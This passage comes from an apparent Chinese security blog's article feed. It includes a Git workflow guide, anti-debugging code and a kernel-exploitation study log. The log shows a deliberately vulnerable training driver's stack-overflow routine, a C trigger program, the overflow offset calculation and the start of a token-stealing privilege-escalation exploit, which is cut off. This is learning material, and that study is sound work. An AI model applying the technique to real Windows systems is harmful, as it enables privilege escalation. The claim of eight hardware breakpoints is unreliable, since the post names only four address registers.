class="number">0</span>,(LPTHREAD_START_ROUTINE)bingleProc,(LPVOID)&amp;stParam,<span class="number">0</span>,&amp;dwThreadId);</span><br><span class="line">       dwRet = WaitForSingleObject(stParam.hEvent,INFINITE);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="comment">//上边的代码是创建线程的，根据创建线程的返回值来作为循环条件。其中stParam是我自定义结构体生成的一个对象。这个对象保存在堆栈中。该结构体的定义如下：</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">STBINGLEPARAM</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  HANDLE hEvent;  <span class="comment">//用于同步的一个信号量</span></span><br><span class="line">  DWORD dwStart;  <span class="comment">//要校验的代码的起始地址</span></span><br><span class="line">  DWORD dwEnd;   <span class="comment">//要校验的代码的终结地址</span></span><br><span class="line">&#125;STBINGLEPARAM,*PBINGLEPARAM;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来是是线程函数了。</span></span><br><span class="line">STBINGLEPARAM *stParam = (STBINGLEPARAM *)lpParameter;</span><br><span class="line">   </span><br><span class="line">  DWORD dwCodeSize = stParam-&gt;dwEnd - stParam-&gt;dwStart;</span><br><span class="line">  BYTE *pbyteBuf = <span class="literal">NULL</span>;</span><br><span class="line">  pbyteBuf = (BYTE *)stParam-&gt;dwStart;</span><br><span class="line">  </span><br><span class="line">  DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">  VirtualProtect((LPVOID)stParam-&gt;dwStart,<span class="number">4</span>*<span class="number">1024</span>,PAGE_EXECUTE_READWRITE,&amp;dwOldProtect);</span><br><span class="line">  <span class="keyword">if</span>(CRC32(pbyteBuf,dwCodeSize) != <span class="number">0xa0eb5866</span>)</span><br><span class="line">  &#123;</span><br><span class="line">     MessageBox(<span class="literal">NULL</span>,<span class="string">&quot;bingle&quot;</span>,<span class="string">&quot;代码被修改了&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;代码被修改了\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">     SetEvent(stParam-&gt;hEvent);</span><br><span class="line">     ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当然除了校验的方法，我们也可以通过设定一个clock，因为我们调试是需要的时间的，因此当我们设置一个clock来计算程序暂停的时间，当超过一个阈值，我们就可以断定我们的的程序正在被调试，可以直接exit()退出，或做一些事情保护我们的程序。</p><h1 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h1><p>硬件断点是有自身的适用场合的:<br>则是当少量的断点即可满足调试任务，或者当我们的调试目标实现了CRC校验的反调试机制。这种类型断点的设置是通过一组CPU上的特殊的寄存器实现的。一个典型的CPU应当有8个的寄存器，这8个寄存器就是我们所说的特殊寄存器，一般称之为调试寄存器。<br>接着下面的内容我们可以稍微详细的介绍一下这8个寄存器<br>DR0到DR3，用于存储所设硬件断点内存地址，也正是因为如此，我们才能只能最多使用8个硬件断点。<br>DR4和DR5会被保留。<br>DR6，这个寄存器上记录了上一次断点触发所产生的调试事件类型信息。因此DR6寄存器又称之为调试状态寄存器。<br>DR7，存储各个断点的触发条件信息，通过设置DR7寄存器上的特定标记位，我们可以断点设定一下的触发条件:</p><ul><li>特定内存地址上的指令被执行触发断点</li><li>当数据被写入一个特定内存弟子时触发断点</li><li>当数据被读出或写入，这是不包括执行，一个特定非可执行内存地址触发断点<br>因此DR7实质上是硬件断点的激活开关。</li></ul></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Git开发使用介绍</title>
      <link href="Us-Git-to-develop-usage-introduction.html"/>
      <url>Us-Git-to-develop-usage-introduction.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Git是目前世界上最先进的分布式版本控制系统，由Linux创始人Linus在2005年开发，用于对抗商业版的版本控制工具BitKeeper，历史比较有意思，感兴趣的师傅们可以搜索了解一下。</p><ul><li>分布式<br>首先要说明的是Git是一个分布式版本控制系统，重点在于分布式。也就是说我们从github上每clone下来一个项目，都是clone下一个完整的仓库，里面包含了远程仓库的所有信息。我们在clone的目录下会发现一个.git目录，这个目录就是本地仓库所在的位置，注意不要去修改这个目录，如果删除了这个目录，本地仓库及其相关信息都会消失。</li><li>工作区和版本库<br>这里的工作区指的是不包括.git目录的所有文件，你可以对工作区进行任意的修改，都不会影响到本地的仓库。<br>.git目录是本地仓库，也叫作版本库。版本库可以粗略的分为两个部分——暂存区和分支区，这两个区域是相互独立的。<br>我们使用“git add”命令把工作区的文件修改添加到暂存区，使用“git commit”命令把暂存区的文件修改提交到当前分支。如下面两幅图，暂存区译为stage。</li><li><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/working-for-git-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/working-for-git-01.png"></a></li><li>暂存区是Git非常重要的特性，需要仔细理解。</li><li>分支<br>每次提交，Git都把它们串成一条时间线，这条时间线就是一个分支。当只有一个分支时，这个分支叫主分支，即master分支。<br>一开始的时候，master分支是一条线，Git让master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点。每次提交，master分支都会向前移动一步，这样，随着你不断提交，master分支的线也越来越长</li></ul><h1 id="开发具体命令以及方法"><a href="#开发具体命令以及方法" class="headerlink" title="开发具体命令以及方法"></a>开发具体命令以及方法</h1><p>工作流程</p><ul><li>克隆项目</li><li>签出dev 分支。</li><li>在dev分支基础上创建自己的分支 member* 。</li><li>在自己的分支上添加文件</li><li>在自己的分支上修改文件</li><li>合并到dev分支</li><li>推送本地dev分支到远程dev分支<br>命令</li><li>修改自己本地的git的用户名和邮箱设置<br>将自己本地的git的用户名和邮箱设置的与github相同，否则你推送之后显示的是别人推送的qwq。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name aaa</span><br><span class="line">$ git config --global user.email aaa@aaa.com</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li>设置本地仓库<br>这一步克隆分支到本地，并且切换到dev分支，随后建立自己的分支。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd [项目路径] </span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;FlappyPig&#x2F;pigcrypto  </span><br><span class="line">$ git checkout dev</span><br><span class="line">$ git checkout -b [MEMBER_NAME]  # [MEMBER_NAME] 是自己的分支名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>git checkout的-b参数表示新建分支，无参数表示切换到现有分支。</li><li>更新本地仓库<br>在这一步进行代码的开发，阶段性开发完成后将代码添加到本地仓库，注意提交注释写的尽量具体，add和commit的作用在第一节说明了。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git add .  #这里可以列出具体要添加的文件，也可以使用.添加所有新增文件</span><br><span class="line">$ git commit -m &quot;提交注释&quot;</span><br></pre></td></tr></table></figure></li><li>m参数后接注释，注释尽量写英文吧233</li><li>将自己的分支合并到本地dev分支<br>本步是在阶段性开发完成后，将自己的分支合并到本地dev分支，准备推送到远程。自己的分支开发完成后，首先我们需要切换回dev分支，随后将自己分支的修改合并到dev分支。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout dev</span><br><span class="line">$ git merge --no-ff [MEMBER_NAME] -m &quot;提交注释&quot;  # [MEMBER_NAME] 是自己的分支名称</span><br></pre></td></tr></table></figure></li><li>-no-ff参数表示强制生成merge日志。</li><li>将本地dev分支推送到远程<br><code>$ git push</code><br>使用该命令之前注意自己的本地分支是否在dev之下（git status查看）。</li></ul><p>如果在推送过程中提示与远程dev分支发生冲突，需要先将远程dev分支同步到本地，解决冲突后再推送，平时尽量避免不同开发人员修改同一个文件。<br>处理代码如下，首先我们使用pull命令同步远程仓库到本地，此时git会提示你处理冲突，处理完成后保存文件。再使用add命令添加处理完的文件，随后commit提交本次冲突处理，然后再去push。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git push </span><br><span class="line">       #                                               # 遇到错误</span><br><span class="line">$ git pull</span><br><span class="line">       # …                                               # 解决冲突</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .  #添加修改后的文件到本地仓库</span><br><span class="line">$ git commit -m &quot;solve conflict:由于XX原因出错，修改XX文件解决问题&quot;</span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure><ul><li>删除自己的分支（可选）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -d [MEMBER_NAME]  # [MEMBER_NAME] 是自己的分支名称</span><br></pre></td></tr></table></figure>自己的本地分支的存在不会影响远程分支。</li><li>常用查询命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git branch                          # 查看自己所在分支 以及自己所拥有的分支</span><br><span class="line">$ git log --graph                      # 查看自己的提交记录</span><br><span class="line">$ git reflog                                            # 查看自己的操作历史</span><br><span class="line">$ git status                                        # 查看本地仓库当前的文件状态</span><br><span class="line">$ git blame [FILE_PATH]                  # 查看文件的每一部分最后由谁改动</span><br></pre></td></tr></table></figure></li></ul></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Kernel Exploit Study(1)</title>
      <link href="Windows-Kernel-Exploit-Study-1.html"/>
      <url>Windows-Kernel-Exploit-Study-1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>之前在一个小群里joker师傅给大家推荐了一波<a href="http://www.hacking-training.com/download/WKE.pdf">Windows Kernel Exploit</a>，这个入门级的windows kernel pwn的资料，正好跟着学习一下内核相关的知识。</p><h4 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01: 环境"></a>0x01: 环境</h4><ol><li>所用系统说明</li></ol><pre><code>物理机 ：windows10虚拟机 ：xp sp3 cn</code></pre><ol start="2"><li>过程中用到的工具</li></ol><pre><code>Visual Studio 2010WindbgProcessExplorerosrloaderv30</code></pre><h4 id="0x02-前期准备"><a href="#0x02-前期准备" class="headerlink" title="0x02: 前期准备"></a>0x02: 前期准备</h4><p>首先是双机调试和驱动加载的问题。<br>双机调试的话，首先修改xp的boot.ini文件，该文件在：<code>C:\boot.ini</code>。添加调试相关的选项，为了方便，我直接加了一个启动项，如图：<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/bootini_conf.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/bootini_conf.png"></a><br>然后在vmware里给xp虚拟机加一个串口就可以了，配置如下图：<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/vm_pipe.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/vm_pipe.png"></a><br>然后，进入windbg，选择：File–Kernel Debug，选中COM栏，填写相应的管道的信息，然后就可以开始调试了。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/windbg_pipe.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/windbg_pipe.png"></a></p><p>想要断下来然后单步可以直接：Debug———Break，这样就可以断下来了。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/dbg_view.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/dbg_view.png"></a><br>之后使用<code>osrloaderv30</code>工具去加载目标驱动。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/sys_loaded.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/sys_loaded.png"></a></p><h4 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03: 分析"></a>0x03: 分析</h4><p>开始只是准备尝试下最简单的Stackoverflow vuln去提权，关于这部分，驱动的源码如下：<br>这里只贴出来派遣例程部分的代码，漏洞很明显，内核里直接使用了用户层传进来的size进行拷贝工作，而没有做任何的check，导致栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">TriggerStackOverflow</span><span class="params">(IN PVOID UserBuffer, IN SIZE_T Size)</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(KernelBuffer));</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Stack Overflow\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以写一个demo去触发这个漏洞，然后使用Token替换的思路去提权。<br>根据<a href="http://www.hacking-training.com/download/WKE.pdf">WEK.pdf</a>的例程，demo如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bof_demo.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)</span></span><br><span class="line"><span class="comment">//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc,_TCHAR* argv[])&#123;</span><br><span class="line"></span><br><span class="line">DWORD lpBytesReturned;</span><br><span class="line">PVOID pMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">PULONG lpInBuffer = <span class="literal">NULL</span>;</span><br><span class="line">LPCSTR lpDeviceName = (LPCSTR) <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>;</span><br><span class="line">SIZE_T nInBufferSize = <span class="number">768</span> * <span class="keyword">sizeof</span>(ULONG);</span><br><span class="line"><span class="comment">//SIZE_T nInBufferSize = 1024 * sizeof(ULONG);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Getting the device handle\r\n&quot;</span>);</span><br><span class="line">HANDLE hDriver = CreateFileA(lpDeviceName,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Failed to get device handle : (0x%X\r\n)&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Got the device Handle : 0x%X\r\n&quot;</span>, hDriver);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Allocating Memory For Input Buffer\r\n&quot;</span>);</span><br><span class="line">lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!lpInBuffer) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]HeapAlloc failed :(0x%X\r\n)&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Input buffer allocated as 0x%X bytes.\r\n&quot;</span>,nInBufferSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Input buffer address : 0x%p\r\n&quot;</span>,lpInBuffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Filling buffer with A&#x27;s\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//char *data = &quot;junk for get bof length....&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//memcpy(lpInBuffer,data,nInBufferSize);</span></span><br><span class="line"></span><br><span class="line">RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, <span class="number">0x41</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Send IOCTL request\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">DeviceIoControl(hDriver,</span><br><span class="line">HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">(LPVOID)lpInBuffer,</span><br><span class="line">(DWORD)nInBufferSize,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">&amp;lpBytesReturned,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]IOCTL request completed,cleaning up da heap.\r\n&quot;</span>);</span><br><span class="line">HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)lpInBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码也很简单，自定义的buffer和size，然后传递给目标驱动的Stackoverflow的派遣例程。</p><h4 id="0x04-过程"><a href="#0x04-过程" class="headerlink" title="0x04: 过程"></a>0x04: 过程</h4><p>下面就可以开始先去确定bof的长度了，使用kali下的pattern_create和pattern_offset工具，他们的路径在kali2下是：<code>/usr/share/metasploit-framework/tools/exploit</code>。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/p_create.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/p_create.png"></a><br>修改上述源码部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *data = <span class="string">&quot;result of ./pattern_create.rb -l 3506&quot;</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(lpInBuffer,data,nInBufferSize);</span><br></pre></td></tr></table></figure><p>重新编译demo_bof，然后运行。<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/crash.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/crash.png"></a><br>崩溃了，eip被覆盖成了junk字符，然后确定偏移：<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/offset.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/offset.png"></a><br>payload应该是：<code>2080 bytes</code> + <code>sc addr</code></p><p>经典的TokenStealingShellcode如下：<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/tokenstealing.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/tokenstealing.png"></a></p><p>构造出来的exploit如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW 